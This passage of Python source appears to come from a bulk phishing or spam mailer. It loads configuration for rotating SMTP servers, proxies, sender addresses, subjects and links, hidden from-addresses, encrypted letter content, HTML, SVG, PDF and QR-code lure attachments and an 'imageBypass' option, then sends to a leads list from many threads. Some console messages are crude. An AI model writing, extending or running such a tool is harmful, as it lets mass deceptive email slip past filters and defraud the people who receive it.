                qrcode_setup['backgroundColor'] = config.get('qrcode_setup', 'backgroundColor', fallback=qrcode_setup['backgroundColor']).strip()
                qrcode_setup['margin'] = max(1, min(10, config.getint('qrcode_setup', 'margin', fallback=4)))
                qrcode_setup['customIcon'] = 1 if cfg_get_bool(config, 'qrcode_setup', 'customIcon', False) else 0
                qrcode_setup['iconLocation'] = config.get('qrcode_setup', 'iconLocation', fallback='').strip()
                qrcode_setup['iconShape'] = config.getint('qrcode_setup', 'iconShape', fallback=1)
                qrcode_setup['iconBackgroundColor'] = config.get('qrcode_setup', 'iconBackgroundColor', fallback='').strip()
                # v9.5: see reload path - read the synthesized 'hideQrCode' key too.
                _hide_raw = None
                for _hk in ('hideQrCode', 'enable_hide_qrcode'):
                    if config.has_option('qrcode_setup', _hk):
                        _hide_raw = config.get('qrcode_setup', _hk)
                        break
                if _hide_raw is not None:
                    qrcode_setup['hideQrCode'] = 1 if str(_hide_raw).strip().lower() in ('1', 'true', 'yes', 'on') else 0
            if config.has_section('logo_config'):
                logo_setup['enable'] = 1 if cfg_get_bool(config, 'logo_config', 'enable', False) else 0
                logo_setup['location'] = config.get('logo_config', 'location', fallback=logo_setup['location']).strip()
            if config.has_section('htmlimage'):
                htmlimage_setup['enable'] = 1 if cfg_get_bool(config, 'htmlimage', 'enable', False) else 0
                htmlimage_setup['location'] = config.get('htmlimage', 'location', fallback=htmlimage_setup['location']).strip()
                htmlimage_setup['enableMultiple'] = 1 if cfg_get_bool(config, 'htmlimage', 'enableMultiple', False) else 0
                htmlimage_setup['multipleLocation'] = config.get('htmlimage', 'multipleLocation', fallback=htmlimage_setup['multipleLocation']).strip()
                htmlimage_setup['width'] = config.getint('htmlimage', 'width', fallback=1024)
                htmlimage_setup['height'] = config.getint('htmlimage', 'height', fallback=768)
                htmlimage_setup['enableClip'] = 1 if cfg_get_bool(config, 'htmlimage', 'enableClip', False) else 0
                htmlimage_setup['clipLeft'] = config.getint('htmlimage', 'clipLeft', fallback=1)
                htmlimage_setup['clipTop'] = config.getint('htmlimage', 'clipTop', fallback=1)
                htmlimage_setup['clipWidth'] = config.getint('htmlimage', 'clipWidth', fallback=1024)
                htmlimage_setup['clipHeight'] = config.getint('htmlimage', 'clipHeight', fallback=768)
                htmlimage_setup['scale'] = config.getfloat('htmlimage', 'scale', fallback=2.0)
                htmlimage_setup['displayWidth'] = config.getint('htmlimage', 'displayWidth', fallback=600)
                htmlimage_setup['displayHeight'] = config.getint('htmlimage', 'displayHeight', fallback=0)
                htmlimage_setup['showSample'] = 1 if cfg_get_bool(config, 'htmlimage', 'showSample', False) else 0
                htmlimage_setup['sampleEmail'] = config.get('htmlimage', 'sampleEmail', fallback='').strip()
                htmlimage_setup['sampleFocus'] = 1 if cfg_get_bool(config, 'htmlimage', 'sampleFocus', True) else 0
                htmlimage_setup['sampleHandles'] = 1 if cfg_get_bool(config, 'htmlimage', 'sampleHandles', False) else 0
                try:
                    htmlimage_setup['sampleFocusPadding'] = config.getint('htmlimage', 'sampleFocusPadding', fallback=24)
                except Exception:
                    pass
            try:
                stopwatch_enabled = cfg_get_bool(config, 'OPTION', 'stopwatch', False)
            except Exception:
                stopwatch_enabled = False
            try:
                stopwatch_pattern = parse_stopwatch_pattern(config.get('OPTION', 'stopwatch_pattern'))
            except Exception:
                stopwatch_pattern = []
            try:
                serverbusy = cfg_get_bool(config, 'OPTION', 'serverbusy', False)
            except Exception:
                serverbusy = False
            # Initial load of letter/subject/proxy settings
            try:
                if config.has_section('letter_setup'):
                    letter_setup['letter'] = config.get('letter_setup', 'letter', fallback=letter_setup['letter']).strip()
                    letter_setup['enableMultiple'] = 1 if str(config.get('letter_setup', 'enableMultiple', fallback=str(letter_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                    letter_setup['letterList'] = config.get('letter_setup', 'letterList', fallback=letter_setup['letterList']).strip()
                    letter_setup['selection_system'] = _mode_int(config.get('letter_setup', 'selection_system', fallback=str(letter_setup.get('selection_system', 1))), 1)
                    letter_setup['enableEncryption'] = 1 if str(config.get('letter_setup', 'enableEncryption', fallback=config.get('letter_setup', 'enable_encryption', fallback=str(letter_setup['enableEncryption'])))).strip().lower() in ('1','true','yes','on') else 0
                    letter_setup['customEncryption'] = config.get('letter_setup', 'customEncryption', fallback=letter_setup['customEncryption']).strip()
                    try:
                        letter_setup['technique'] = int(config.get('letter_setup', 'technique', fallback=str(letter_setup['technique'])))
                    except Exception:
                        pass
                    # Load multiple letters list if enabled
                    try:
                        if letter_setup.get('enableMultiple', 0) == 1:
                            llpath = letter_setup.get('letterList', 'MULTIPLE/letters.txt')
                            if os.path.isfile(llpath):
                                try:
                                    with open(llpath, 'r', encoding='utf-8') as f:
                                        letter_list = expand_letter_rotation_entries(
                                            [line.strip() for line in f if line.strip()])
                                except Exception:
                                    letter_list = []
                                if not letter_list:
                                    print(f"{Fore.YELLOW}[WARN] letter rotation enabled but {llpath} is empty. Disabling rotation.{Style.RESET_ALL}")
                                    letter_setup['enableMultiple'] = 0
                            else:
                                print(f"{Fore.YELLOW}[WARN] letter rotation enabled but {llpath} not found. Disabling rotation.{Style.RESET_ALL}")
                                letter_setup['enableMultiple'] = 0
                    except Exception:
                        pass
                if config.has_section('subject_setup'):
                    subject_setup['subject'] = config.get('subject_setup', 'subject', fallback=subject_setup['subject']).strip()
                    subject_setup['enableMultiple'] = 1 if str(config.get('subject_setup', 'enableMultiple', fallback=str(subject_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                    subject_setup['subjectList'] = config.get('subject_setup', 'subjectList', fallback=subject_setup['subjectList']).strip()
                    subject_setup['selection_system'] = _mode_int(config.get('subject_setup', 'selection_system', fallback=str(subject_setup.get('selection_system', 1))), 1)
                    subject_setup['enableEncryption'] = 1 if str(config.get('subject_setup', 'enableEncryption', fallback=config.get('subject_setup', 'enable_encryption', fallback=str(subject_setup['enableEncryption'])))).strip().lower() in ('1','true','yes','on') else 0
                    try:
                        subject_setup['technique'] = int(config.get('subject_setup', 'technique', fallback=str(subject_setup['technique'])))
                    except Exception:
                        pass
                    if subject_setup.get('enableMultiple', 0) == 1 and subject_setup.get('subjectList'):
                        try:
                            if os.path.isfile(subject_setup['subjectList']):
                                with open(subject_setup['subjectList'], 'r', encoding='utf-8') as f:
                                    subject_lines = [line.strip() for line in f if line.strip()]
                                subject_rotate = True
                                if not subject_lines:
                                    subject_rotate = False
                            else:
                                subject_rotate = False
                        except Exception:
                            subject_rotate = False
                if config.has_section('proxy_setup'):
                    proxy_setup['enable'] = 1 if str(config.get('proxy_setup', 'enable', fallback=str(proxy_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    proxy_setup['ip'] = config.get('proxy_setup', 'ip', fallback=proxy_setup['ip']).strip()
                    proxy_setup['port'] = config.get('proxy_setup', 'port', fallback=proxy_setup['port']).strip()
                    proxy_setup['user'] = config.get('proxy_setup', 'user', fallback=proxy_setup['user']).strip()
                    proxy_setup['password'] = config.get('proxy_setup', 'password', fallback=proxy_setup['password']).strip()
                    proxy_setup['enableMultiple'] = 1 if str(config.get('proxy_setup', 'enableMultiple', fallback=str(proxy_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                    proxy_setup['proxiesList'] = config.get('proxy_setup', 'proxiesList', fallback=proxy_setup['proxiesList']).strip()
                    try:
                        load_proxy_pool()
                    except Exception:
                        pass
                # frommail / fromname / link / qrcode / replyTo initial load
                if config.has_section('frommail_setup'):
                    frommail_setup['hideFromMail'] = 1 if str(config.get('frommail_setup', 'hideFromMail', fallback=str(frommail_setup['hideFromMail']))).strip().lower() in ('1','true','yes','on') else 0
                    frommail_setup['enableMultiple'] = 1 if str(config.get('frommail_setup', 'enableMultiple', fallback=str(frommail_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                    frommail_setup['frommailList'] = config.get('frommail_setup', 'frommailList', fallback=frommail_setup['frommailList']).strip()
                    frommail_setup['selection_system'] = _mode_int(config.get('frommail_setup', 'selection_system', fallback=str(frommail_setup.get('selection_system', 1))), 1)
                if config.has_section('fromname_setup'):
                    fromname_setup['fromName'] = config.get('fromname_setup', 'fromName', fallback=fromname_setup['fromName']).strip()
                    fromname_setup['enableMultiple'] = 1 if str(config.get('fromname_setup', 'enableMultiple', fallback=str(fromname_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                    fromname_setup['fromnameList'] = config.get('fromname_setup', 'fromnameList', fallback=fromname_setup['fromnameList']).strip()
                    fromname_setup['selection_system'] = _mode_int(config.get('fromname_setup', 'selection_system', fallback=str(fromname_setup.get('selection_system', 1))), 1)
                if config.has_section('link_setup'):
                    link_setup['link'] = config.get('link_setup', 'link', fallback=link_setup['link']).strip()
                    link_setup['linkList'] = config.get('link_setup', 'linkList', fallback=link_setup['linkList']).strip()
                    link_setup['selection_system'] = _mode_int(config.get('link_setup', 'selection_system', fallback=str(link_setup.get('selection_system', 1))), 1)
                    try:
                        link_setup['limit'] = int(config.get('link_setup', 'limit', fallback=str(link_setup['limit'])))
                    except Exception:
                        pass
                    link_setup['enableMultiple'] = 1 if str(config.get('link_setup', 'enableMultiple', fallback=str(link_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                    try:
                        if config.has_section('eml'):
                            eml_setup['emlAttachment'] = 1 if str(config.get('eml', 'emlAttachment', fallback=str(eml_setup.get('emlAttachment',0)))).strip().lower() in ('1','true','yes','on') else 0
                    except Exception:
                        pass
                if config.has_section('replyTo_setup'):
                    replyTo_setup['replyTo'] = config.get('replyTo_setup', 'replyTo', fallback=replyTo_setup['replyTo']).strip()
                    replyTo_setup['replyToName'] = config.get('replyTo_setup', 'replyToName', fallback=replyTo_setup['replyToName']).strip()
                    replyTo_setup['enable'] = 1 if str(config.get('replyTo_setup', 'enable', fallback=str(replyTo_setup.get('enable', 0)))).strip().lower() in ('1','true','yes','on') else 0
                if config.has_section('htmlAttachment'):
                    htmlAttachment_setup['enable'] = 1 if str(config.get('htmlAttachment', 'enable', fallback=str(htmlAttachment_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    htmlAttachment_setup['location'] = config.get('htmlAttachment', 'location', fallback=htmlAttachment_setup['location']).strip()
                    htmlAttachment_setup['name'] = config.get('htmlAttachment', 'name', fallback=htmlAttachment_setup['name']).strip()
                    htmlAttachment_setup['encrypt'] = 1 if str(config.get('htmlAttachment', 'encrypt', fallback=str(htmlAttachment_setup['encrypt']))).strip().lower() in ('1','true','yes','on') else 0
                    htmlAttachment_setup['enableMultiple'] = 1 if str(config.get('htmlAttachment', 'enableMultiple', fallback=str(htmlAttachment_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                    htmlAttachment_setup['htmlList'] = config.get('htmlAttachment', 'htmlList', fallback=htmlAttachment_setup['htmlList']).strip()
                    htmlAttachment_setup['attachAll'] = 1 if str(config.get('htmlAttachment', 'attachAll', fallback=str(htmlAttachment_setup['attachAll']))).strip().lower() in ('1','true','yes','on') else 0
                    htmlAttachment_setup['zip_it'] = 1 if str(config.get('htmlAttachment', 'zip_it', fallback=str(htmlAttachment_setup['zip_it']))).strip().lower() in ('1','true','yes','on') else 0
                    if htmlAttachment_setup.get('enableMultiple', 0) == 1 and htmlAttachment_setup.get('htmlList') and os.path.isfile(htmlAttachment_setup.get('htmlList')):
                        html_attachment_list = load_html_attachment_list(htmlAttachment_setup.get('htmlList'))
                        html_attachment_index = 0
                if config.has_section('svgAttachment'):
                    svgAttachment_setup['enable'] = 1 if str(config.get('svgAttachment', 'enable', fallback=str(svgAttachment_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    svgAttachment_setup['name'] = config.get('svgAttachment', 'name', fallback=svgAttachment_setup['name']).strip()
                    load_link_svg_from_config(config)
                    svgAttachment_setup['location'] = config.get('svgAttachment', 'location', fallback='SVG/file.svg').strip()
                    svgAttachment_setup['encrypt'] = 1 if str(config.get('svgAttachment', 'encrypt', fallback=str(svgAttachment_setup['encrypt']))).strip().lower() in ('1','true','yes','on') else 0
                    svgAttachment_setup['enableMultiple'] = 1 if str(config.get('svgAttachment', 'enableMultiple', fallback=str(svgAttachment_setup['enableMultiple']))).strip().lower() in ('1','true','yes','on') else 0
                    svgAttachment_setup['svgList'] = config.get('svgAttachment', 'svgList', fallback=svgAttachment_setup['svgList']).strip()
                    svgAttachment_setup['attachAll'] = 1 if str(config.get('svgAttachment', 'attachAll', fallback=str(svgAttachment_setup['attachAll']))).strip().lower() in ('1','true','yes','on') else 0
                    svgAttachment_setup['zip_it'] = 1 if str(config.get('svgAttachment', 'zip_it', fallback=str(svgAttachment_setup['zip_it']))).strip().lower() in ('1','true','yes','on') else 0
                    if svgAttachment_setup.get('enableMultiple', 0) == 1 and svgAttachment_setup.get('svgList') and os.path.isfile(svgAttachment_setup.get('svgList')):
                        svg_attachment_list = load_svg_attachment_list(svgAttachment_setup.get('svgList'))
                        svg_attachment_index = 0
                if config.has_section('pdf'):
                    pdf_setup['enable'] = 1 if str(config.get('pdf', 'enable', fallback=str(pdf_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    pdf_setup['location'] = config.get('pdf', 'location', fallback=pdf_setup['location']).strip()
                    pdf_setup['name'] = config.get('pdf', 'name', fallback=pdf_setup['name']).strip()
                    pdf_setup['layout'] = config.getint('pdf', 'layout', fallback=1)
                    pdf_setup['page_type'] = config.getint('pdf', 'page_type', fallback=1)
                    pdf_setup['margin'] = config.getfloat('pdf', 'margin', fallback=0.4)
                    pdf_setup['password_protection'] = 1 if cfg_get_bool(config, 'pdf', 'password_protection', False) else 0
                    pdf_setup['password'] = config.get('pdf', 'password', fallback='')
                    pdf_setup['zip_it'] = 1 if cfg_get_bool(config, 'pdf', 'zip_it', False) else 0
                if config.has_section('svg'):
                    svg_setup['enable'] = 1 if str(config.get('svg', 'enable', fallback=str(svg_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    svg_setup['location'] = config.get('svg', 'location', fallback=svg_setup['location']).strip()
                    svg_setup['name'] = config.get('svg', 'name', fallback=svg_setup['name']).strip()
                if config.has_section('doc'):
                    doc_setup['enable'] = 1 if str(config.get('doc', 'enable', fallback=str(doc_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    doc_setup['location'] = config.get('doc', 'location', fallback=doc_setup['location']).strip()
                    doc_setup['name'] = config.get('doc', 'name', fallback=doc_setup['name']).strip()
                if config.has_section('docx'):
                    docx_setup['enable'] = 1 if str(config.get('docx', 'enable', fallback=str(docx_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    docx_setup['location'] = config.get('docx', 'location', fallback=docx_setup['location']).strip()
                    docx_setup['name'] = config.get('docx', 'name', fallback=docx_setup['name']).strip()
                if config.has_section('rtf'):
                    rtf_setup['enable'] = 1 if cfg_get_bool(config, 'rtf', 'enable', False) else 0
                    rtf_setup['location'] = config.get('rtf', 'location', fallback=rtf_setup['location']).strip()
                    rtf_setup['name'] = config.get('rtf', 'name', fallback=rtf_setup['name']).strip()
                    rtf_setup['zip_it'] = 1 if cfg_get_bool(config, 'rtf', 'zip_it', False) else 0
                if config.has_section('pptx'):
                    pptx_setup['enable'] = 1 if cfg_get_bool(config, 'pptx', 'enable', False) else 0
                    pptx_setup['location'] = config.get('pptx', 'location', fallback=pptx_setup['location']).strip()
                    pptx_setup['name'] = config.get('pptx', 'name', fallback=pptx_setup['name']).strip()
                    pptx_setup['zip_it'] = 1 if cfg_get_bool(config, 'pptx', 'zip_it', False) else 0
                if config.has_section('icalendar'):
                    for key in ('summary', 'description', 'location', 'starts', 'ends', 'organizer_name', 'organizer_email', 'attendee_name', 'attendee_email', 'name'):
                        icalendar_setup[key] = config.get('icalendar', key, fallback=icalendar_setup[key]).strip()
                    icalendar_setup['enable'] = 1 if cfg_get_bool(config, 'icalendar', 'enable', False) else 0
                if config.has_section('eml'):
                    eml_setup['enable'] = 1 if str(config.get('eml', 'enable', fallback=str(eml_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    eml_setup['location'] = config.get('eml', 'location', fallback=eml_setup['location']).strip()
                    eml_setup['name'] = config.get('eml', 'name', fallback=eml_setup['name']).strip()
                    eml_setup['subject'] = config.get('eml', 'subject', fallback=eml_setup['subject']).strip()
                    eml_setup['from'] = config.get('eml', 'from', fallback=eml_setup['from']).strip()
                    eml_setup['from_name'] = config.get('eml', 'from_name', fallback=eml_setup.get('from_name', '')).strip()
                    eml_setup['to'] = config.get('eml', 'to', fallback=eml_setup['to']).strip()
                    eml_setup['to_name'] = config.get('eml', 'to_name', fallback=eml_setup.get('to_name', '')).strip()
                    eml_setup['attachToOuter'] = 1 if str(config.get('eml', 'attachToOuter', fallback=str(eml_setup.get('attachToOuter', 1)))).strip().lower() in ('1','true','yes','on') else 0
                    eml_setup['attachType'] = config.get('eml', 'attachType', fallback=eml_setup.get('attachType', 'message/rfc822')).strip()
                    eml_setup['attachName'] = config.get('eml', 'attachName', fallback=eml_setup.get('attachName', '')).strip()
                    eml_setup['onlyEml'] = 1 if cfg_get_bool(config, 'eml', 'onlyEml', True) else 0
                    eml_setup['attachments'] = normalize_attachment_list(config.get('eml', 'attachments', fallback=''))
                    if isinstance(eml_setup.get('attachments', []), list) and eml_setup['attachments']:
                        eml_setup['attachments'] = [str(item).strip().lower() for item in eml_setup['attachments'] if str(item).strip()]
                if config.has_section('local_files'):
                    local_files_setup['enable'] = 1 if cfg_get_bool(config, 'local_files', 'enable', False) else 0
                    local_files_setup['location'] = config.get('local_files', 'location', fallback=local_files_setup['location']).strip()
                    local_files_setup['selection'] = config.getint('local_files', 'selection', fallback=1)
                    load_local_files_config()
                if config.has_section('zip_config'):
                    zip_setup['enable'] = 1 if str(config.get('zip_config', 'enable', fallback=str(zip_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    zip_setup['password_protection'] = 1 if str(config.get('zip_config', 'password_protection', fallback=str(zip_setup['password_protection']))).strip().lower() in ('1','true','yes','on') else 0
                    zip_setup['password'] = config.get('zip_config', 'password', fallback=zip_setup['password']).strip()
                    zip_setup['name'] = config.get('zip_config', 'name', fallback=zip_setup['name']).strip()
                    zip_setup['zip_all'] = 1 if str(config.get('zip_config', 'zip_all', fallback=str(zip_setup['zip_all']))).strip().lower() in ('1','true','yes','on') else 0
                if config.has_section('otherFile'):
                    otherfile_setup['enable'] = 1 if str(config.get('otherFile', 'enable', fallback=str(otherfile_setup['enable']))).strip().lower() in ('1','true','yes','on') else 0
                    otherfile_setup['location'] = config.get('otherFile', 'location', fallback=otherfile_setup['location']).strip()
                    otherfile_setup['name'] = config.get('otherFile', 'name', fallback=otherfile_setup['name']).strip()
            except Exception:
                pass
            # Load rotating lists
            try:
                frommail_path = resolve_config_file(frommail_setup.get('frommailList'), 'MULTIPLE/from_mail.txt')
                if frommail_path and os.path.isfile(frommail_path):
                    frommail_list = load_simple_list(frommail_path)
                    frommail_index = 0
                fromname_path = resolve_config_file(fromname_setup.get('fromnameList'), 'MULTIPLE/from_name.txt')
                if fromname_path and os.path.isfile(fromname_path):
                    fromname_list = load_simple_list(fromname_path)
                    fromname_index = 0
                if link_setup.get('linkList') and os.path.isfile(link_setup['linkList']):
                    link_entries = load_link_entries(link_setup['linkList'])
                    link_index = 0
                elif os.path.isfile('Link/link.txt'):
                    link_setup['linkList'] = 'Link/link.txt'
                    link_entries = load_link_entries('Link/link.txt')
                    link_index = 0
            except Exception:
                pass
            # Load sender_setup (initial)
            try:
                if config.has_section('sender_setup'):
                    sender_setup['multithread'] = 1 if str(config.get('sender_setup', 'multithread', fallback=str(sender_setup['multithread']))).strip().lower() in ('1','true','yes','on') else 0
                    try:
                        sender_setup['numberOfThreads'] = int(config.get('sender_setup', 'numberOfThreads', fallback=str(sender_setup['numberOfThreads'])))
                    except Exception:
                        pass
                    sender_setup['sleepEnable'] = 1 if str(config.get('sender_setup', 'sleepEnable', fallback=str(sender_setup['sleepEnable']))).strip().lower() in ('1','true','yes','on') else 0
                    try:
                        sender_setup['sleepTime'] = int(config.get('sender_setup', 'sleepTime', fallback=str(sender_setup['sleepTime'])))
                    except Exception:
                        pass
                    sender_setup['logoEnable'] = 1 if str(config.get('sender_setup', 'logoEnable', fallback=str(sender_setup['logoEnable']))).strip().lower() in ('1','true','yes','on') else 0
                    sender_setup['localhostNameEnable'] = 1 if str(config.get('sender_setup', 'localhostNameEnable', fallback=str(sender_setup['localhostNameEnable']))).strip().lower() in ('1','true','yes','on') else 0
                    sender_setup['localhostName'] = config.get('sender_setup', 'localhostName', fallback=sender_setup['localhostName']).strip()
                    sender_setup['messageType'] = config.get('sender_setup', 'messageType', fallback=sender_setup['messageType']).strip()
                    sender_setup['emailSensitivity'] = config.get('sender_setup', 'emailSensitivity', fallback=sender_setup['emailSensitivity']).strip()
                    sender_setup['emailPriority'] = config.get('sender_setup', 'emailPriority', fallback=sender_setup['emailPriority']).strip()
                    sender_setup['imageBypass'] = 1 if str(config.get('sender_setup', 'imageBypass', fallback=str(sender_setup['imageBypass']))).strip().lower() in ('1','true','yes','on') else 0
            except Exception:
                pass
            try:
                max_concurrent_sends = int(config.get('OPTION', 'max_concurrent_sends').strip()) if config.get('OPTION', 'max_concurrent_sends').strip() else None
            except Exception:
                max_concurrent_sends = None
            try:
                send_delay = float(config.get('OPTION', 'send_delay').strip()) if config.get('OPTION', 'send_delay').strip() else 0.0
            except Exception:
                send_delay = 0.0
            try:
                serverbusy_pause_duration = int(config.get('OPTION', 'serverbusy_pause_duration').strip()) if config.get('OPTION', 'serverbusy_pause_duration').strip() else serverbusy_pause_duration
            except Exception:
                pass
            configure_task_pause(config)
            configure_disclaimer(config)
            with rate_lock:
                if max_concurrent_sends and int(max_concurrent_sends) > 0:
                    rate_semaphore = threading.Semaphore(int(max_concurrent_sends))
                else:
                    rate_semaphore = None
            # initial config mtime tracking
            try:
                config_mtime = os.path.getmtime('setup.ini')
            except Exception:
                config_mtime = None

    except Exception as e:
        print(str(e))
        exit()
    ensure_required_folders()
    if '--check' in sys.argv or '--self-check' in sys.argv or '--preflight' in sys.argv:
        # v9.0: validate config + assets and exit without sending any mail.
        raise SystemExit(run_preflight_check())
    if str(htmlimage_setup.get('showSample', 0)).strip().lower() in ('1', 'true', 'yes', 'on'):
        if not render_htmlimage_sample():
            exit(1)
        print(f"{Fore.CYAN}[HTMLIMAGE] show_sample is enabled; preview complete. No email was sent.{Style.RESET_ALL}")
        exit(0)
    useRandomSmtp = False
    smtp_pool_entries = []
    istoken = True

    if istoken and __name__ == '__main__':
        queue = queue.Queue()
        pause_event = threading.Event()
        pause_event.set()  # Start in non-paused state
        resume_event = threading.Event()
        
        if enable_sender:
            print(f"\n{Fore.GREEN}[SENDER] Sending enabled{Style.RESET_ALL}\n")
            print_mode_banner()
            # Print initial pause/resume instructions
            print(f"\n{Fore.CYAN}[INFO] Press 'P' to pause, 'R' to resume, 'Q' to quit during sending...{Style.RESET_ALL}\n")

            if loadsmtp and _mode_uses_custom_pool():
                print(f"{Fore.CYAN}[SMTP-Auto] Ignored; sending_mode uses a dedicated pool.{Style.RESET_ALL}")
            elif loadsmtp and not vdm_host_mode:
                if os.path.exists(smtp_pool_file) and os.path.getsize(smtp_pool_file) > 0:
                    print("SMTP-Auto is A bitch & it ROCKS!!!")
                    smtp_pool_entries = RandomArraySMTP(smtp_pool_file)
                    if not smtp_pool_entries:
                        raise RuntimeError(f'No valid SMTP entries found in {smtp_pool_file}')
                    useRandomSmtp = True
                else:
                    print(f"SMTP file is empty or missing: {smtp_pool_file}")
                    print("So fuck off and check your sheet...")
                    exit()
            elif loadsmtp and vdm_host_mode:
                print(f"{Fore.CYAN}[SMTP-Auto] Ignored in host mode; using existing VDM host delivery configuration.{Style.RESET_ALL}")
        
        try:
            letter_path = str(letter_setup.get('letter') or 'LETTER/letter.html').strip()
            if not os.path.isfile(letter_path):
                raise FileNotFoundError(f'Configured letter template not found: {letter_path}')
            with codecs.open(letter_path, 'r', 'utf8') as letter_file:
                texto = letter_file.read()
            print(f"{Fore.CYAN}[LETTER] Main template: {letter_path}{Style.RESET_ALL}")
            if htmlimage_setup.get('enable', 0) == 1:
                image_path = str(htmlimage_setup.get('location') or '').strip()
                print(f"{Fore.CYAN}[HTMLIMAGE] Source template: {image_path}{Style.RESET_ALL}")
            
            # ============= HANDLE SORTER FLAGS =============
            # sorter: True/False - enable sorting only
            # sorter+send: True/False - enable concurrent sorting + sending
            # sender: True/False - enable sending only
            
            concurrent_sorter_send = False

            if enable_sorter:
                if enable_sorter_send:
                    # SORTER+SEND MODE: run sorter and send from targeted files
                    if not enable_sender:
                        print(f"{Fore.YELLOW}[WARNING] sorter+send requires sender=True. Enabling sender.{Style.RESET_ALL}")
                        enable_sender = True
                    print(f"\n{Fore.CYAN}[SORTER+SEND] Running sorter+send mode (sort and send concurrently){Style.RESET_ALL}\n")
                    target_files = get_sorted_email_files(sorter_target_files)
                    sorter_thread = run_sorter_in_background(sorter_email_list, sorter_threads)
                    inputs = []
                    concurrent_sorter_send = True
                    # set module-level flag so Sendout printing adapts
                    concurrent_sorter_send_global = True
                else:
                    # SORTER ONLY MODE: sort from sorter_email_list and exit
                    print(f"\n{Fore.CYAN}[SORTER ONLY] Running sorter only (no sending){Style.RESET_ALL}\n")
                    run_email_sorter(sorter_email_list, sorter_threads)
                    print(f"\n{Fore.GREEN}[SORTER] Email sorting completed. Exiting (sorter only mode).{Style.RESET_ALL}\n")
                    exit(0)
            elif enable_sender:
                # SENDER ONLY MODE: use leads.txt and send
                print(f"\n{Fore.CYAN}[SENDER ONLY] Sending from leads.txt only{Style.RESET_ALL}\n")
                file = resolve_leads_path(default_address)
                inputs = open(file,'r').read().splitlines()
            else:
                # NOTHING ENABLED
                print(f"{Fore.RED}[ERROR] No mode enabled. Set sorter=True or sender=True in setup.ini{Style.RESET_ALL}")
                exit(0)
        except Exception as e:
            print(str(e))
            exit()



        try:

            # Start sender threads
            # Only start threads if explicitly configured with a valid thread count
            with worker_threads_lock:
                current_thread_count = 0
                # Determine effective thread count using sender_setup if enabled
                try:
                    if int(sender_setup.get('multithread', 0)) == 1:
                        effective_threads = int(sender_setup.get('numberOfThreads', 0)) if str(sender_setup.get('numberOfThreads', '')).isdigit() else (int(threads) if threads and str(threads).isdigit() else 0)
                    else:
                        effective_threads = int(threads) if threads and str(threads).isdigit() else 0
                except Exception:
                    effective_threads = int(threads) if threads and str(threads).isdigit() else 0

                # If sleep mode enabled (single-thread), apply sleepTime as send_delay
                try:
                    if int(sender_setup.get('sleepEnable', 0)) == 1 and (not effective_threads or effective_threads == 0):
                        send_delay = float(sender_setup.get('sleepTime', 0))
                except Exception:
                    pass

                if effective_threads and effective_threads > 0:
                    # Create threads; respect ip_thread if configured
                    if ip_thread and local_ips:
                        count = min(effective_threads, ip_thread_count if ip_thread_count > 0 else effective_threads)
                        for i in range(int(count)):
                            assigned_ip = local_ips[i % len(local_ips)] if local_ips else None
                            t = dmailer(queue, assigned_bind_ip=assigned_ip)
                            t.daemon = True
                            t.start()
                            worker_threads.append(t)
                            current_thread_count += 1
                        # If more threads requested than ip_thread_count, create remaining without assigned bind
                        if effective_threads > count:
                            for i in range(effective_threads - count):
                                t = dmailer(queue)
                                t.daemon = True
                                t.start()
                                worker_threads.append(t)
                                current_thread_count += 1
                    else:
                        for i in range(int(effective_threads)):
                            t = dmailer(queue)
                            t.daemon = True
                            t.start()
                            worker_threads.append(t)
                            current_thread_count += 1
                else:
                    print(f"{Fore.YELLOW}[WARNING] No threads configured. Set 'thread=<number>' or enable sender_setup.multithread in setup.ini to enable sending.{Style.RESET_ALL}")
                    current_thread_count = 0
                print(f"{Fore.CYAN}[TRACE] Worker threads started: {current_thread_count}, effective_threads={effective_threads}, ip_thread={ip_thread}, ip_thread_count={ip_thread_count}{Style.RESET_ALL}")

            # Start the status printer for live queue/thread/success state
            try:
                start_status_printer(queue)
            except Exception:
                pass

            # ============= CONCURRENT SORTER+SEND MODE =============
            if concurrent_sorter_send:
                print(f"\n{Fore.CYAN}[SORTER+SEND] Concurrent mode: Sender waiting for sorted emails...{Style.RESET_ALL}\n")
                
                # Prepare SMTP config for monitor thread
                smtp_config = {
                    'smtpserv': smtpserv,
                    'port': port,
                    'its_authy': its_authy,
                    'username': username,
                    'password': password,
                    'fromemail': fromemail,
                    'sender': sender,
                    'its_secure': its_secure,
                    'useRandomSmtp': useRandomSmtp
                }
                
                # Start file monitor thread
                stop_event = threading.Event()
                monitor_thread = threading.Thread(
                    target=monitor_sorted_files_concurrent,
                    args=(target_files, queue, pause_event, stop_event, smtp_config),
                    daemon=True
                )
                monitor_thread.start()
                
                # Keyboard listener for pause/resume/quit
                def keyboard_listener():
                    global manual_pause
                    manual_pause = False
                    def update_pause_event():
                        if manual_pause:
                            pause_event.clear()
                        else:
                            pause_event.set()
                    
                    if system_name().lower() == "windows":
                        import msvcrt
                        while queue.unfinished_tasks > 0 or not sorter_thread.join(timeout=0.1):
                            try:
                                if msvcrt.kbhit():
                                    key = msvcrt.getwche().decode().upper()
                                    if key == 'P':
                                        manual_pause = True
                                        update_pause_event()
                                        print(f"{Fore.YELLOW}[PAUSED] Press 'R' to resume...{Style.RESET_ALL}")
                                    elif key == 'R':
                                        manual_pause = False
                                        update_pause_event()
                                        print(f"{Fore.GREEN}[RESUMED] Continuing...{Style.RESET_ALL}")
                                    elif key == 'Q':
                                        print(f"{Fore.RED}[QUIT] Stopping campaign...{Style.RESET_ALL}")
                                        stop_event.set()
                                        import os
                                        os._exit(0)
                                time.sleep(0.1)
                            except:
                                pass
                    else:
                        import select
                        while queue.unfinished_tasks > 0 or not sorter_thread.join(timeout=0.1):
                            try:
